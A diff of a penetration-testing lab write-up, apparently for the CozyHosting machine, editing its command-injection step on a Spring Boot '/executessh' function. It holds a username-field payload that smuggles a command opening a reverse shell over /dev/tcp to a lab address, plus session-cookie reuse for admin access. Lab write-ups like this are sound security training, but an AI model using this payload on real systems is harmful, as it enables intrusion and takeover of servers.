@@ -77,7 +77,7 @@ In order to check the execution, a 404 HTTP GET request will be performed agains
 
 ## Initial Access – Command Injection
 
-**Vulnerability Explanation**: misconfigured Spring Boot application that exposes other users’ session cookies has a insecure function “/executessh” where it is possible to inject com-mands to open a reverse shell.
+**Vulnerability Explanation**: misconfigured Spring Boot application that exposes other users’ session cookies has a insecure function “/executessh” where it is possible to inject commands to open a reverse shell.
 
 **Vulnerability Fix**: securely store session cookies and correctly sanitize user input on “/executessh” function.
 
@@ -89,7 +89,10 @@ In order to check the execution, a 404 HTTP GET request will be performed agains
 
 •	Setup a listener on port 444.
 
-•	Using that cookie access the Admin dashboard and insert on username parameter: kanderson@%0A(sh)0>/dev/tcp/10.10.14.10/444;a
+•	Using that cookie access the Admin dashboard and insert
+
+   - Hostname parameter: localhost
+   - Username parameter: kanderson@%0A(sh)0>/dev/tcp/10.10.14.10/444;a
  
 ![image](images/Cozyhosting/Imagen19.png)
 
